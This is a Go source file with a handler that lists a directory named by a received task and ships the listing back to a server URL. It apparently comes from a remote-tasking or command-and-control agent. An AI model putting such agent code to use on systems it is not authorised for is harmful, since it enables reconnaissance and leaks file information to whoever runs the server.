package main

import (
	"fmt"
	"os"
	"time"
)

func LsHandler(serverUrl string, taskData map[string]interface{}) {
	dir, err := listDirectories(taskData["args"].(string))
	if err != nil {
		DataShipper(serverUrl, taskData, err.Error())
		return
	}
	DataShipper(serverUrl, taskData, dir)
}

func listDirectories(directory string) (string, error) {
	fileList := ""
	dir, err := os.Open(directory)
	if err != nil {
		return "", err
	}
	defer dir.Close()

	files, err := dir.Readdir(-1)
	if err != nil {
		return "", err
	}
	for _, file := range files {
		line := fmt.Sprintf("%-15s %-22v %-10d %-20s\n", file.Mode(), file.ModTime().UTC().Format(time.RFC3339), file.Size(), file.Name())
		fileList += line
	}
	return fileList, nil
}
